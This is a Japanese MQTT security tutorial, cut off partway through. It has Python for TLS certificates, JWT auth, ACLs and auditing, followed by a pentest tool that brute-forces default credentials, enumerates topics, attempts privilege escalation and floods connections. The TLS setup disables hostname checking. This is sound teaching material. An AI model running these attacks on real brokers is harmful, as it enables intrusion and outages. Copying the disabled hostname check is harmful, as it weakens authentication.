# ハンズオン 05: セキュリティ実装

## 🎯 学習目標

このハンズオンでは本格的なMQTTセキュリティ実装について学習します：

- TLS/SSL暗号化通信の実装
- クライアント証明書認証システム
- JWTトークンベース認証
- アクセス制御リスト（ACL）の実装
- セキュリティ監査とロギング
- ペネトレーションテストとセキュリティ評価

**所要時間**: 約120分

## 📋 前提条件

- [04-security-and-authentication](../04-security-and-authentication/) の完了
- 公開鍵暗号化とTLSの基本理解
- Python暗号化ライブラリの基本知識

## 🔒 セキュリティアーキテクチャ

### 多層セキュリティモデル

```
┌─────────────────────────────────────────┐
│          Transport Layer               │ ← TLS 1.3 暗号化
├─────────────────────────────────────────┤
│       Authentication Layer            │ ← 証明書 + JWT
├─────────────────────────────────────────┤
│       Authorization Layer             │ ← ACL + RBAC
├─────────────────────────────────────────┤
│         Audit Layer                   │ ← ログ + 監視
├─────────────────────────────────────────┤
│      Application Layer                │ ← メッセージ暗号化
└─────────────────────────────────────────┘
```

## 📝 実装演習

### Exercise 1: 高度なTLS実装

`src/advanced_tls_client.py` を作成：

```python
import ssl
import socket
import paho.mqtt.client as mqtt
import json
import time
import hashlib
import hmac
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Callable
from pathlib import Path
import logging
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import jwt

console = Console()
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SecurityError(Exception):
    """セキュリティ関連エラー"""
    pass

class CertificateManager:
    """証明書管理クラス"""
    
    def __init__(self, cert_dir: Path = Path("certs")):
        self.cert_dir = cert_dir
        self.cert_dir.mkdir(exist_ok=True)
        
    def generate_ca_certificate(self, 
                               common_name: str = "MQTT-CA",
                               country: str = "JP",
                               organization: str = "MQTT-Security-Lab") -> tuple:
        """CA証明書の生成"""
        console.print("🔐 CA証明書を生成中...", style="blue")
        
        # 秘密鍵生成
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096,
        )
        
        # 証明書の基本情報
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, country),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, organization),
            x509.NameAttribute(NameOID.COMMON_NAME, common_name),
        ])
        
        # 証明書作成
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=3650)  # 10年間有効
        ).add_extension(
            x509.BasicConstraints(ca=True, path_length=None),
            critical=True,
        ).add_extension(
            x509.KeyUsage(
                digital_signature=True,
                key_cert_sign=True,
                crl_sign=True,
                key_encipherment=False,
                data_encipherment=False,
                key_agreement=False,
                content_commitment=False
            ),
            critical=True,
        ).sign(private_key, hashes.SHA256())
        
        # ファイルに保存
        ca_cert_path = self.cert_dir / "ca.crt"
        ca_key_path = self.cert_dir / "ca.key"
        
        with open(ca_cert_path, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        with open(ca_key_path, "wb") as f:
            f.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        console.print(f"✅ CA証明書を生成: {ca_cert_path}", style="green")
        return cert, private_key, ca_cert_path, ca_key_path
    
    def generate_client_certificate(self, 
                                   client_name: str,
                                   ca_cert_path: Path,
                                   ca_key_path: Path,
                                   client_permissions: List[str] = None) -> tuple:
        """クライアント証明書の生成"""
        console.print(f"🔑 {client_name}のクライアント証明書を生成中...", style="blue")
        
        # CA証明書と秘密鍵を読み込み
        with open(ca_cert_path, "rb") as f:
            ca_cert = x509.load_pem_x509_certificate(f.read())
        
        with open(ca_key_path, "rb") as f:
            ca_private_key = serialization.load_pem_private_key(
                f.read(), password=None
            )
        
        # クライアント秘密鍵生成
        client_private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        
        # 証明書の基本情報
        subject = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "JP"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "MQTT-Clients"),
            x509.NameAttribute(NameOID.COMMON_NAME, client_name),
        ])
        
        # 拡張フィールドの準備
        extensions = [
            x509.BasicConstraints(ca=False, path_length=None),
            x509.KeyUsage(
                digital_signature=True,
                key_encipherment=True,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                content_commitment=False,
                data_encipherment=False
            ),
            x509.ExtendedKeyUsage([
                x509.oid.ExtendedKeyUsageOID.CLIENT_AUTH
            ])
        ]
        
        # クライアント権限を拡張フィールドに追加
        if client_permissions:
            permissions_str = ",".join(client_permissions)
            extensions.append(
                x509.UnrecognizedExtension(
                    oid=x509.ObjectIdentifier("1.3.6.1.4.1.999999.1"),
                    value=permissions_str.encode()
                )
            )
        
        # 証明書作成
        cert_builder = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            ca_cert.subject
        ).public_key(
            client_private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=365)  # 1年間有効
        )
        
        # 拡張フィールドを追加
        for ext in extensions:
            cert_builder = cert_builder.add_extension(ext, critical=False)
        
        client_cert = cert_builder.sign(ca_private_key, hashes.SHA256())
        
        # ファイルに保存
        client_cert_path = self.cert_dir / f"{client_name}.crt"
        client_key_path = self.cert_dir / f"{client_name}.key"
        
        with open(client_cert_path, "wb") as f:
            f.write(client_cert.public_bytes(serialization.Encoding.PEM))
        
        with open(client_key_path, "wb") as f:
            f.write(client_private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        console.print(f"✅ クライアント証明書を生成: {client_cert_path}", style="green")
        return client_cert, client_private_key, client_cert_path, client_key_path

class JWTAuthManager:
    """JWT認証管理クラス"""
    
    def __init__(self, secret_key: str = None):
        self.secret_key = secret_key or self._generate_secret_key()
        self.tokens: Dict[str, Dict] = {}  # トークンキャッシュ
        
    def _generate_secret_key(self) -> str:
        """秘密鍵の生成"""
        import secrets
        return secrets.token_hex(32)
    
    def create_token(self, 
                    client_id: str,
                    permissions: List[str],
                    expires_hours: int = 24) -> str:
        """JWTトークンの作成"""
        payload = {
            'client_id': client_id,
            'permissions': permissions,
            'iat': datetime.utcnow(),
            'exp': datetime.utcnow() + timedelta(hours=expires_hours),
            'iss': 'mqtt-security-lab'
        }
        
        token = jwt.encode(payload, self.secret_key, algorithm='HS256')
        self.tokens[client_id] = payload
        
        console.print(f"🎫 {client_id}のJWTトークンを作成", style="green")
        return token
    
    def verify_token(self, token: str) -> Dict[str, Any]:
        """JWTトークンの検証"""
        try:
            payload = jwt.decode(token, self.secret_key, algorithms=['HS256'])
            return payload
        except jwt.ExpiredSignatureError:
            raise SecurityError("Token has expired")
        except jwt.InvalidTokenError:
            raise SecurityError("Invalid token")
    
    def revoke_token(self, client_id: str):
        """トークンの無効化"""
        if client_id in self.tokens:
            del self.tokens[client_id]
            console.print(f"❌ {client_id}のトークンを無効化", style="yellow")

class AccessControlList:
    """アクセス制御リスト（ACL）実装"""
    
    def __init__(self):
        self.rules: Dict[str, Dict[str, Any]] = {}
        self.load_default_rules()
    
    def load_default_rules(self):
        """デフォルトACLルールの読み込み"""
        self.rules = {
            'admin': {
                'read': ['#'],  # 全トピック読み取り可能
                'write': ['#'], # 全トピック書き込み可能
                'subscribe': ['#']
            },
            'sensor_device': {
                'read': [],
                'write': ['sensors/+/data', 'devices/+/status'],
                'subscribe': ['devices/+/commands/+']
            },
            'dashboard': {
                'read': ['sensors/+/+', 'alerts/+'],
                'write': ['commands/+/+'],
                'subscribe': ['sensors/+/+', 'alerts/+', 'devices/+/status']
            },
            'guest': {
                'read': ['public/+'],
                'write': [],
                'subscribe': ['public/+']
            }
        }
    
    def check_permission(self, client_role: str, action: str, topic: str) -> bool:
        """権限チェック"""
        if client_role not in self.rules:
            return False
        
        allowed_patterns = self.rules[client_role].get(action, [])
        
        for pattern in allowed_patterns:
            if self._topic_matches_pattern(topic, pattern):
                return True
        
        return False
    
    def _topic_matches_pattern(self, topic: str, pattern: str) -> bool:
        """トピックパターンマッチング"""
        if pattern == '#':
            return True
        
        topic_parts = topic.split('/')
        pattern_parts = pattern.split('/')
        
        if len(pattern_parts) > len(topic_parts):
            return False
        
        for i, pattern_part in enumerate(pattern_parts):
            if pattern_part == '#':
                return True
            elif pattern_part == '+':
                continue
            elif i >= len(topic_parts) or pattern_part != topic_parts[i]:
                return False
        
        return len(pattern_parts) == len(topic_parts)
    
    def add_rule(self, role: str, action: str, topic_pattern: str):
        """ACLルールの追加"""
        if role not in self.rules:
            self.rules[role] = {'read': [], 'write': [], 'subscribe': []}
        
        if topic_pattern not in self.rules[role][action]:
            self.rules[role][action].append(topic_pattern)
            console.print(f"✅ ACLルール追加: {role} -> {action} -> {topic_pattern}", style="green")

class SecurityAuditor:
    """セキュリティ監査クラス"""
    
    def __init__(self):
        self.audit_log: List[Dict] = []
        self.suspicious_activity_threshold = 10  # 疑わしい活動の閾値
        self.client_activity: Dict[str, List] = {}
    
    def log_security_event(self, 
                          event_type: str,
                          client_id: str,
                          details: Dict[str, Any],
                          severity: str = 'INFO'):
        """セキュリティイベントのログ記録"""
        event = {
            'timestamp': datetime.now().isoformat(),
            'event_type': event_type,
            'client_id': client_id,
            'details': details,
            'severity': severity
        }
        
        self.audit_log.append(event)
        
        # クライアント活動追跡
        if client_id not in self.client_activity:
            self.client_activity[client_id] = []
        self.client_activity[client_id].append(event)
        
        # 疑わしい活動の検出
        if len(self.client_activity[client_id]) > self.suspicious_activity_threshold:
            self._detect_suspicious_activity(client_id)
        
        # 重要度に応じてコンソール出力
        if severity in ['WARNING', 'ERROR', 'CRITICAL']:
            style = {
                'WARNING': 'yellow',
                'ERROR': 'red', 
                'CRITICAL': 'bold red'
            }.get(severity, 'white')
            
            console.print(f"🚨 [{severity}] {event_type}: {client_id}", style=style)
    
    def _detect_suspicious_activity(self, client_id: str):
        """疑わしい活動の検出"""
        recent_events = self.client_activity[client_id][-self.suspicious_activity_threshold:]
        
        # 短時間での大量接続試行
        connection_attempts = [e for e in recent_events if e['event_type'] == 'AUTH_FAILURE']
        if len(connection_attempts) > 5:
            self.log_security_event(
                'SUSPICIOUS_AUTH_ATTEMPTS',
                client_id,
                {'attempts': len(connection_attempts)},
                'WARNING'
            )
        
        # 異常なトピックアクセスパターン
        access_attempts = [e for e in recent_events if e['event_type'] == 'ACCESS_DENIED']
        if len(access_attempts) > 3:
            self.log_security_event(
                'SUSPICIOUS_ACCESS_PATTERN',
                client_id,
                {'denied_attempts': len(access_attempts)},
                'WARNING'
            )
    
    def generate_security_report(self) -> Dict[str, Any]:
        """セキュリティレポートの生成"""
        if not self.audit_log:
            return {'status': 'No security events recorded'}
        
        # イベントタイプ別集計
        event_types = {}
        severity_counts = {}
        client_stats = {}
        
        for event in self.audit_log:
            event_type = event['event_type']
            severity = event['severity']
            client_id = event['client_id']
            
            event_types[event_type] = event_types.get(event_type, 0) + 1
            severity_counts[severity] = severity_counts.get(severity, 0) + 1
            client_stats[client_id] = client_stats.get(client_id, 0) + 1
        
        # 最も問題のあるクライアント
        most_problematic = max(client_stats.items(), key=lambda x: x[1]) if client_stats else None
        
        # 最近の重要なイベント
        critical_events = [e for e in self.audit_log[-50:] 
                          if e['severity'] in ['ERROR', 'CRITICAL']]
        
        return {
            'total_events': len(self.audit_log),
            'event_types': event_types,
            'severity_counts': severity_counts,
            'most_problematic_client': most_problematic,
            'recent_critical_events': critical_events[-10:],  # 最新10件
            'unique_clients': len(client_stats)
        }

class SecureMQTTClient:
    """セキュアMQTTクライアント"""
    
    def __init__(self,
                 client_id: str,
                 cert_manager: CertificateManager,
                 jwt_manager: JWTAuthManager,
                 acl: AccessControlList,
                 auditor: SecurityAuditor):
        
        self.client_id = client_id
        self.cert_manager = cert_manager
        self.jwt_manager = jwt_manager
        self.acl = acl
        self.auditor = auditor
        
        self.client = mqtt.Client(client_id=client_id)
        self.jwt_token = None
        self.client_role = None
        
        self.setup_mqtt_handlers()
    
    def setup_mqtt_handlers(self):
        """MQTTイベントハンドラーの設定"""
        self.client.on_connect = self.on_connect
        self.client.on_disconnect = self.on_disconnect
        self.client.on_message = self.on_message
        self.client.on_publish = self.on_publish
        self.client.on_subscribe = self.on_subscribe
    
    def on_connect(self, client, userdata, flags, rc):
        """接続時のコールバック"""
        if rc == 0:
            console.print(f"✅ {self.client_id} がセキュア接続完了", style="green")
            self.auditor.log_security_event(
                'CLIENT_CONNECTED',
                self.client_id,
                {'connection_flags': flags}
            )
        else:
            console.print(f"❌ {self.client_id} 接続失敗: {rc}", style="red")
            self.auditor.log_security_event(
                'AUTH_FAILURE',
                self.client_id,
                {'return_code': rc},
                'ERROR'
            )
    
    def on_disconnect(self, client, userdata, rc):
        """切断時のコールバック"""
        if rc != 0:
            self.auditor.log_security_event(
                'UNEXPECTED_DISCONNECT',
                self.client_id,
                {'return_code': rc},
                'WARNING'
            )
    
    def on_message(self, client, userdata, msg):
        """メッセージ受信時のコールバック"""
        # 受信権限チェック
        if not self.acl.check_permission(self.client_role, 'read', msg.topic):
            self.auditor.log_security_event(
                'ACCESS_DENIED',
                self.client_id,
                {'action': 'read', 'topic': msg.topic},
                'WARNING'
            )
            return
        
        console.print(f"📨 {self.client_id} 受信: {msg.topic}", style="dim")
        self.auditor.log_security_event(
            'MESSAGE_RECEIVED',
            self.client_id,
            {'topic': msg.topic, 'qos': msg.qos}
        )
    
    def on_publish(self, client, userdata, mid):
        """メッセージ送信時のコールバック"""
        self.auditor.log_security_event(
            'MESSAGE_PUBLISHED',
            self.client_id,
            {'message_id': mid}
        )
    
    def on_subscribe(self, client, userdata, mid, granted_qos):
        """購読時のコールバック"""
        self.auditor.log_security_event(
            'SUBSCRIPTION_GRANTED',
            self.client_id,
            {'message_id': mid, 'granted_qos': granted_qos}
        )
    
    def setup_tls_connection(self, 
                           ca_cert_path: Path,
                           client_cert_path: Path,
                           client_key_path: Path):
        """TLS接続の設定"""
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_REQUIRED
        context.load_verify_locations(str(ca_cert_path))
        context.load_cert_chain(str(client_cert_path), str(client_key_path))
        
        # セキュリティ強化
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
        
        self.client.tls_set_context(context)
        console.print(f"🔒 {self.client_id} TLS設定完了", style="green")
    
    def authenticate_with_jwt(self, jwt_token: str, role: str):
        """JWT認証"""
        try:
            payload = self.jwt_manager.verify_token(jwt_token)
            self.jwt_token = jwt_token
            self.client_role = role
            
            # MQTTユーザー名/パスワード認証でJWTを使用
            self.client.username_pw_set(
                username=self.client_id,
                password=jwt_token
            )
            
            console.print(f"🎫 {self.client_id} JWT認証成功", style="green")
            self.auditor.log_security_event(
                'JWT_AUTH_SUCCESS',
                self.client_id,
                {'role': role, 'token_exp': payload.get('exp')}
            )
            
        except SecurityError as e:
            console.print(f"❌ JWT認証失敗: {e}", style="red")
            self.auditor.log_security_event(
                'JWT_AUTH_FAILURE',
                self.client_id,
                {'error': str(e)},
                'ERROR'
            )
            raise
    
    def secure_publish(self, topic: str, payload: str, qos: int = 1):
        """セキュアメッセージ送信"""
        # 送信権限チェック
        if not self.acl.check_permission(self.client_role, 'write', topic):
            console.print(f"❌ {self.client_id} 送信権限なし: {topic}", style="red")
            self.auditor.log_security_event(
                'ACCESS_DENIED',
                self.client_id,
                {'action': 'write', 'topic': topic},
                'WARNING'
            )
            return False
        
        # メッセージにセキュリティヘッダーを追加
        enhanced_payload = {
            'data': payload,
            'client_id': self.client_id,
            'timestamp': datetime.now().isoformat(),
            'signature': self._sign_message(payload)
        }
        
        self.client.publish(topic, json.dumps(enhanced_payload), qos)
        console.print(f"📤 {self.client_id} 送信: {topic}", style="green")
        return True
    
    def secure_subscribe(self, topic: str, qos: int = 1):
        """セキュア購読"""
        # 購読権限チェック
        if not self.acl.check_permission(self.client_role, 'subscribe', topic):
            console.print(f"❌ {self.client_id} 購読権限なし: {topic}", style="red")
            self.auditor.log_security_event(
                'ACCESS_DENIED',
                self.client_id,
                {'action': 'subscribe', 'topic': topic},
                'WARNING'
            )
            return False
        
        self.client.subscribe(topic, qos)
        console.print(f"📡 {self.client_id} 購読: {topic}", style="blue")
        return True
    
    def _sign_message(self, message: str) -> str:
        """メッセージ署名"""
        if not self.jwt_token:
            return ""
        
        signature = hmac.new(
            self.jwt_token.encode(),
            message.encode(),
            hashlib.sha256
        ).hexdigest()
        
        return signature
    
    def connect_secure(self, host: str = "localhost", port: int = 8883):
        """セキュア接続"""
        try:
            self.client.connect(host, port, 60)
            self.client.loop_start()
            time.sleep(2)  # 接続完了まで待機
            return True
        except Exception as e:
            console.print(f"❌ セキュア接続失敗: {e}", style="red")
            self.auditor.log_security_event(
                'CONNECTION_FAILURE',
                self.client_id,
                {'error': str(e), 'host': host, 'port': port},
                'ERROR'
            )
            return False
    
    def disconnect(self):
        """接続切断"""
        self.client.loop_stop()
        self.client.disconnect()
        console.print(f"👋 {self.client_id} 接続切断", style="yellow")
        self.auditor.log_security_event(
            'CLIENT_DISCONNECTED',
            self.client_id,
            {}
        )

# 使用例とデモ
def main():
    """メイン実行関数"""
    console.print("🔒 MQTT セキュリティ実装ハンズオン", style="bold blue")
    console.print("=" * 60)
    
    # セキュリティコンポーネントの初期化
    cert_manager = CertificateManager()
    jwt_manager = JWTAuthManager()
    acl = AccessControlList()
    auditor = SecurityAuditor()
    
    try:
        # CA証明書の生成
        ca_cert, ca_key, ca_cert_path, ca_key_path = cert_manager.generate_ca_certificate()
        
        # クライアント証明書の生成（複数の権限レベル）
        clients_config = [
            ('admin_client', ['admin']),
            ('sensor_device_01', ['sensor_device']), 
            ('dashboard_client', ['dashboard']),
            ('guest_client', ['guest'])
        ]
        
        secure_clients = []
        
        for client_name, permissions in clients_config:
            # クライアント証明書生成
            cert_manager.generate_client_certificate(
                client_name, ca_cert_path, ca_key_path, permissions
            )
            
            # JWTトークン生成
            jwt_token = jwt_manager.create_token(client_name, permissions)
            
            # セキュアクライアント作成
            secure_client = SecureMQTTClient(
                client_name, cert_manager, jwt_manager, acl, auditor
            )
            
            # TLS設定
            client_cert_path = cert_manager.cert_dir / f"{client_name}.crt"
            client_key_path = cert_manager.cert_dir / f"{client_name}.key"
            secure_client.setup_tls_connection(ca_cert_path, client_cert_path, client_key_path)
            
            # JWT認証
            role = permissions[0] if permissions else 'guest'
            secure_client.authenticate_with_jwt(jwt_token, role)
            
            secure_clients.append(secure_client)
        
        console.print("\n🔐 セキュリティテスト開始", style="bold cyan")
        
        # セキュリティテストのシミュレーション
        test_scenarios = [
            ("正当なセンサーデータ送信", "sensor_device_01", "sensors/room1/temperature", "22.5"),
            ("管理者による設定変更", "admin_client", "config/system/update", '{"version": "1.2.3"}'),
            ("ゲストによる制限トピックアクセス試行", "guest_client", "admin/config", "unauthorized"),
            ("ダッシュボードによるアラート送信", "dashboard_client", "alerts/high_temp", '{"temp": 35.2}'),
            ("不正なトピックアクセス試行", "sensor_device_01", "admin/delete", "malicious")
        ]
        
        for test_name, client_name, topic, payload in test_scenarios:
            console.print(f"\n📋 テスト: {test_name}", style="yellow")
            
            # クライアント検索
            client = next((c for c in secure_clients if c.client_id == client_name), None)
            if client:
                success = client.secure_publish(topic, payload)
                if success:
                    console.print("  ✅ 送信成功", style="green")
                else:
                    console.print("  ❌ 送信失敗（権限不足）", style="red")
            
            time.sleep(1)
        
        # セキュリティレポート生成
        console.print("\n📊 セキュリティ監査レポート", style="bold blue")
        report = auditor.generate_security_report()
        
        # レポート表示
        report_table = Table(title="セキュリティイベント統計")
        report_table.add_column("項目", style="cyan", no_wrap=True)
        report_table.add_column("値", style="magenta")
        
        report_table.add_row("総イベント数", str(report['total_events']))
        report_table.add_row("ユニーククライアント数", str(report['unique_clients']))
        
        # 重要度別統計
        for severity, count in report['severity_counts'].items():
            report_table.add_row(f"{severity}レベル", str(count))
        
        console.print(report_table)
        
        # 最も問題のあるクライアント
        if report['most_problematic_client']:
            client_name, event_count = report['most_problematic_client']
            console.print(f"\n⚠️ 最も活動の多いクライアント: {client_name} ({event_count}イベント)", 
                         style="yellow")
        
        # 重要なセキュリティイベント
        if report['recent_critical_events']:
            console.print(f"\n🚨 最近の重要イベント ({len(report['recent_critical_events'])}件):", 
                         style="red")
            for event in report['recent_critical_events']:
                console.print(f"  • [{event['severity']}] {event['event_type']}: {event['client_id']}")
        
        console.print("\n✅ セキュリティ実装ハンズオン完了！", style="bold green")
        
    except Exception as e:
        console.print(f"\n❌ エラーが発生しました: {e}", style="red")
        auditor.log_security_event(
            'SYSTEM_ERROR',
            'system',
            {'error': str(e)},
            'CRITICAL'
        )
    finally:
        # クリーンアップ
        for client in secure_clients:
            client.disconnect()

if __name__ == "__main__":
    main()
```

### Exercise 2: ペネトレーションテストツール

`src/security_penetration_test.py` を作成：

```python
import paho.mqtt.client as mqtt
import ssl
import socket
import threading
import time
import json
import random
import string
from datetime import datetime
from typing import List, Dict, Any
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()

class MQTTPenetrationTester:
    """MQTT セキュリティペネトレーションテスター"""
    
    def __init__(self, target_host: str = "localhost", target_port: int = 1883):
        self.target_host = target_host
        self.target_port = target_port
        self.test_results = []
        self.vulnerability_found = []
        
    def run_comprehensive_test(self):
        """包括的セキュリティテストの実行"""
        console.print("🔍 MQTT ペネトレーションテスト開始", style="bold red")
        console.print(f"対象: {self.target_host}:{self.target_port}")
        console.print("=" * 60)
        
        tests = [
            ("接続テスト", self.test_basic_connectivity),
            ("匿名接続テスト", self.test_anonymous_connection),
            ("ブルートフォース攻撃", self.test_brute_force_auth),
            ("トピック列挙攻撃", self.test_topic_enumeration),
            ("権限昇格テスト", self.test_privilege_escalation),
            ("DoS攻撃テスト", self.test_dos_attack),
            ("メッセージインジェクション", self.test_message_injection),
            ("プロトコル異常テスト", self.test_protocol_anomalies)
        ]
        
        for test_name, test_func in tests:
            console.print(f"\n🔍 実行中: {test_name}", style="yellow")
            try:
                result = test_func()
                self.test_results.append({
                    'test_name': test_name,
                    'result': result,
                    'timestamp': datetime.now().isoformat()
                })
                
                if result.get('vulnerability'):
                    self.vulnerability_found.append({
                        'test': test_name,
                        'details': result
                    })
                
            except Exception as e:
                console.print(f"❌ テスト失敗: {e}", style="red")
        
        self.generate_security_report()
    
    def test_basic_connectivity(self) -> Dict[str, Any]:
        """基本接続テスト"""
        result = {
            'vulnerability': False,
            'details': {},
            'severity': 'INFO'
        }
        
        try:
            # 標準MQTT接続テスト
            client = mqtt.Client("pentest_basic")
            client.connect(self.target_host, self.target_port, 10)
            client.loop_start()
            time.sleep(2)
            client.disconnect()
            client.loop_stop()
            
            result['details']['mqtt_accessible'] = True
            console.print("  ✅ 標準MQTT接続成功", style="green")
            
            # WebSocket接続テスト（ポート9001）
            try:
                ws_client = mqtt.Client("pentest_websocket", transport="websockets")
                ws_client.connect(self.target_host, 9001, 10)
                ws_client.disconnect()
                result['details']['websocket_accessible'] = True
                console.print("  ✅ WebSocket MQTT接続成功", style="green")
            except:
                result['details']['websocket_accessible'] = False
                console.print("  ℹ️ WebSocket MQTT接続不可", style="dim")
            
        except Exception as e:
            result['details']['error'] = str(e)
            console.print(f"  ❌ 基本接続失敗: {e}", style="red")
            
        return result
    
    def test_anonymous_connection(self) -> Dict[str, Any]:
        """匿名接続テスト"""
        result = {
            'vulnerability': False,
            'details': {},
            'severity': 'MEDIUM'
        }
        
        try:
            client = mqtt.Client("pentest_anonymous")
            # ユーザー名/パスワードなしで接続試行
            client.connect(self.target_host, self.target_port, 10)
            client.loop_start()
            time.sleep(2)
            
            # テストメッセージの送信試行
            try:
                client.publish("pentest/anonymous", "test message")
                result['vulnerability'] = True
                result['details']['anonymous_publish'] = True
                console.print("  ⚠️ 匿名でのメッセージ送信が可能", style="yellow")
            except:
                result['details']['anonymous_publish'] = False
                console.print("  ✅ 匿名での送信は制限されています", style="green")
            
            client.disconnect()
            client.loop_stop()
            
            result['details']['anonymous_connection'] = True
            console.print("  ⚠️ 匿名接続が許可されています", style="yellow")
            
        except Exception as e:
            result['details']['anonymous_connection'] = False
            result['details']['error'] = str(e)
            console.print("  ✅ 匿名接続は拒否されました", style="green")
            
        return result
    
    def test_brute_force_auth(self) -> Dict[str, Any]:
        """ブルートフォース認証攻撃テスト"""
        result = {
            'vulnerability': False,
            'details': {},
            'severity': 'HIGH'
        }
        
        # よくあるユーザー名/パスワードの組み合わせ
        common_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('mqtt', 'mqtt'),
            ('user', 'user'),
            ('guest', 'guest'),
            ('test', 'test'),
            ('root', 'root')
        ]
        
        successful_logins = []
        
        console.print("  🔓 一般的な認証情報をテスト中...", style="blue")
        
        for username, password in common_credentials:
            try:
                client = mqtt.Client(f"pentest_brute_{username}")
                client.username_pw_set(username, password)
                client.connect(self.target_host, self.target_port, 5)
                client.loop_start()
                time.sleep(1)
                client.disconnect()
                client.loop_stop()
                
                successful_logins.append((username, password))
                console.print(f"    ⚠️ 成功: {username}:{password}", style="red")
                
            except Exception:
                console.print(f"    ✅ 失敗: {username}:{password}", style="dim")
            
            time.sleep(0.5)  # レート制限を避ける
        
        if successful_logins:
            result['vulnerability'] = True
            result['details']['weak_credentials'] = successful_logins
            result['severity'] = 'HIGH'
        else:
            console.print("  ✅ 弱い認証情報では侵入できませんでした", style="green")
        
        return result
    
    def test_topic_enumeration(self) -> Dict[str, Any]:
        """トピック列挙攻撃テスト"""
        result = {
            'vulnerability': False,
            'details': {},
            'severity': 'MEDIUM'
        }
        
        # よくあるトピックパターン
        common_topics = [
            '#',  # すべてのトピック
            '+/+/+',
            'admin/#',
            'config/#',
            'system/#',
            'devices/+/credentials',
            'users/+/password',
            '$SYS/#',  # システム情報
            'sensors/+/+',
            'alerts/#'
        ]
        
        accessible_topics = []
        received_messages = []
        
        def on_message(client, userdata, msg):
            received_messages.append({
                'topic': msg.topic,
                'payload': msg.payload.decode('utf-8', errors='ignore')[:100]
            })
        
        try:
            client = mqtt.Client("pentest_enum")
            client.on_message = on_message
            client.connect(self.target_host, self.target_port, 10)
            client.loop_start()
            
            console.print("  🔍 トピック列挙中...", style="blue")
            
            for topic in common_topics:
                try:
                    client.subscribe(topic)
                    time.sleep(2)
                    
                    if received_messages:
                        accessible_topics.append({
                            'topic': topic,
                            'message_count': len(received_messages)
                        })
                        console.print(f"    ⚠️ アクセス可能: {topic} ({len(received_messages)}件)", 
                                     style="yellow")
                    
                    client.unsubscribe(topic)
                    received_messages.clear()
                    
                except Exception as e:
                    console.print(f"    ✅ アクセス拒否: {topic}", style="dim")
            
            client.disconnect()
            client.loop_stop()
            
        except Exception as e:
            result['details']['error'] = str(e)
        
        if accessible_topics:
            result['vulnerability'] = True
            result['details']['accessible_topics'] = accessible_topics
            console.print(f"  ⚠️ {len(accessible_topics)}個のトピックにアクセス可能", style="yellow")
        else:
            console.print("  ✅ センシティブなトピックへの不正アクセスはブロックされています", style="green")
        
        return result
    
    def test_privilege_escalation(self) -> Dict[str, Any]:
        """権限昇格テスト"""
        result = {
            'vulnerability': False,
            'details': {},
            'severity': 'HIGH'
        }
        
        # 特権的なトピックへの書き込み試行
        privileged_topics = [
            'admin/config/update',
            'system/shutdown',
            'users/create',
            'firmware/update',
            'certificates/revoke'
        ]
        
        successful_writes = []
        
        try:
            # 低権限ユーザーでの接続を想定
            client = mqtt.Client("pentest_privilege")
            client.username_pw_set("guest", "guest")  # ゲストアカウントを想定
            client.connect(self.target_host, self.target_port, 10)
            client.loop_start()
            
            console.print("  🔓 権限昇格テスト中...", style="blue")
            
            for topic in privileged_topics:
                try:
                    malicious_payload = json.dumps({
                        'command': 'privilege_escalation_test',
                        'timestamp': datetime.now().isoformat(),
                        'user': 'pentest'
                    })
                    
                    info = client.publish(topic, malicious_payload)
                    info.wait_for_publish(timeout=2)
                    
                    successful_writes.append(topic)
                    console.print(f"    ⚠️ 書き込み成功: {topic}", style="red")
                    
                except Exception:
                    console.print(f"    ✅ 書き込み拒否: {topic}", style="dim")
            
            client.disconnect()
            client.loop_stop()
            
        except Exception as e:
            result['details']['auth_error'] = str(e)
            console.print("  ℹ️ 認証が必要なため、権限昇格テストをスキップ", style="blue")
        
        if successful_writes:
            result['vulnerability'] = True
            result['details']['privilege_escalation'] = successful_writes
            console.print(f"  ⚠️ {len(successful_writes)}個の特権トピックに書き込み可能", style="red")
        
        return result
    
    def test_dos_attack(self) -> Dict[str, Any]:
        """DoS攻撃テスト（軽量版）"""
        result = {
            'vulnerability': False,
            'details': {},
            'severity': 'HIGH'
        }
        
        console.print("  💥 軽量DoS攻撃テスト中...", style="blue")
        
        # 大量接続テスト
        connection_count = 0
        max_connections = 50  # 軽量テスト用
        
        clients = []
        
        try:
            for i in range(max_connections):
                try:
                    client = mqtt.Client(f"pentest_dos_{i}")
                    client.connect(self.target_host, self.target_port, 5)
                    clients.append(client)
                    connection_count += 1
                    
                    if i % 10 == 0:
